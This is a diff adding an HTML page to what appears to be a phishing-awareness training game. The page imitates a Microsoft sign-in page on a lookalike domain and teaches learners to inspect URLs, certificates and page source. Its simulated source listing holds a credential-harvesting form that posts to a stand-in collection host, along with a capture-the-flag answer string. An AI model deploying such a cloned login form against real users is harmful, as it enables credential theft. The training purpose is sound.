@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+  <title>Sandboxed browser</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+  <div class="sim-ribbon">Sandboxed browser · this site is fake and local</div>
+
+  <div class="browser-chrome">
+    <button class="chrome-btn" onclick="goBack()" aria-label="Back">&#8592;</button>
+    <button class="chrome-btn disabled" aria-label="Forward">&#8594;</button>
+    <div class="url-bar" onclick="inspectUrl()">
+      <span class="lock">&#128274;</span>
+      <span class="url-text mono" id="url">https://micr0soft-support.example/verify/login</span>
+    </div>
+    <button class="chrome-btn" onclick="togglePageInfo()" aria-label="Page details">&#9432;</button>
+  </div>
+
+  <div class="panel" id="url-panel">
+    <h3>Address breakdown</h3>
+    <div class="kv"><span>Scheme</span><span class="mono">https</span></div>
+    <div class="kv"><span>Host</span><span class="mono">micr0soft-support.example</span></div>
+    <div class="kv"><span>Registered domain</span><span class="mono">micr0soft-support.example</span></div>
+    <div class="kv"><span>Path</span><span class="mono">/verify/login</span></div>
+    <div class="kv"><span>Padlock means</span><span>The connection is encrypted. It says nothing about who owns the site.</span></div>
+  </div>
+
+  <div class="panel" id="info-panel">
+    <h3>Page details</h3>
+    <div class="kv"><span>Page title</span><span>Microsoft account · Security verification</span></div>
+    <div class="kv"><span>Certificate</span><span>Valid, issued 3 days ago to micr0soft-support.example</span></div>
+    <div class="kv"><span>Server</span><span class="mono">vps-77-214.hosting.example</span></div>
+    <div class="kv"><span>Form posts to</span><span class="mono">https://harvest.micr0soft-support.example/collect.php</span></div>
+    <button class="link-btn" onclick="viewSource()">View page source</button>
+    <div class="source" id="source-box" style="display:none"></div>
+  </div>
+
+  <div class="site">
+    <div class="brandline">Microsoft</div>
+    <h2>Security verification</h2>
+    <p>Your account has been limited. Sign in to confirm your identity and restore access.</p>
+
+    <label for="u">Email or username</label>
+    <input id="u" type="text" autocomplete="off" placeholder="name@example.com">
+
+    <label for="p">Password</label>
+    <input id="p" type="password" autocomplete="off" placeholder="Password">
+
+    <button onclick="fakeSubmit()">Verify</button>
+  </div>
+
+  <div class="caught" id="caught">
+    <strong>Simulated credential capture</strong>
+    On a real page, what you just typed would now be sitting on the collection host in the
+    page details panel. Nothing was sent or stored here — the fields have been cleared.
+  </div>
+
+  <div class="foot">This page is bundled with the app. It has no network access.</div>
+
+  <script src="script.js"></script>
+  <script>
+    var SOURCE_LINES = [
+      '<!DOCTYPE html>',
+      '<html lang="en">',
+      '<head>',
+      '  <meta charset="utf-8">',
+      '  <title>Microsoft account · Security verification</title>',
+      '  <link rel="stylesheet" href="/assets/ms-clone.css">',
+      '</head>',
+      '<body>',
+      '  <div class="logo">Microsoft</div>',
+      '  <h1>Security verification</h1>',
+      '',
+      '  <!-- kit: mx-harvest v3.2 | build CYBERITY{inbox_compromised} | remove before deploy -->',
+      '',
+      '  <form method="post" action="https://harvest.micr0soft-support.example/collect.php">',
+      '    <input name="login" type="text">',
+      '    <input name="passwd" type="password">',
+      '    <input name="campaign" type="hidden" value="cvsu-sept">',
+      '    <button type="submit">Verify</button>',
+      '  </form>',
+      '</body>',
+      '</html>'
+    ];
+
+    function goBack() {
+      if (window.history.length > 1) window.history.back();
+      else window.location.href = 'email.html#m365';
+    }
+
+    function inspectUrl() {
+      var panel = document.getElementById('url-panel');
+      var first = !panel.classList.contains('open');
+      panel.classList.toggle('open');
+      if (first) Cyberity.urlInspected(document.getElementById('url').textContent);
+    }
+
+    function togglePageInfo() {
+      var panel = document.getElementById('info-panel');
+      var first = !panel.classList.contains('open');
+      panel.classList.toggle('open');
+      if (first) Cyberity.clueFound('page_info_opened');
+    }
+
+    function viewSource() {
+      var box = document.getElementById('source-box');
+      if (box.style.display === 'block') { box.style.display = 'none'; return; }
+
+      var html = SOURCE_LINES.map(function (line) {
+        var safe = escapeHtml(line);
+        return line.indexOf('<!--') !== -1
+          ? '<span class="cmt">' + safe + '</span>'
+          : safe;
+      }).join('\n');
+
+      box.innerHTML = html;
+      box.style.display = 'block';
+      Cyberity.clueFound('source_viewed');
+      Cyberity.flagDiscovered('page_source');
+    }
+
+    function fakeSubmit() {
+      document.getElementById('u').value = '';
+      document.getElementById('p').value = '';
+      document.getElementById('caught').classList.add('open');
+      Cyberity.clueFound('credentials_submitted');
+    }
+  </script>
+</body>
+</html>
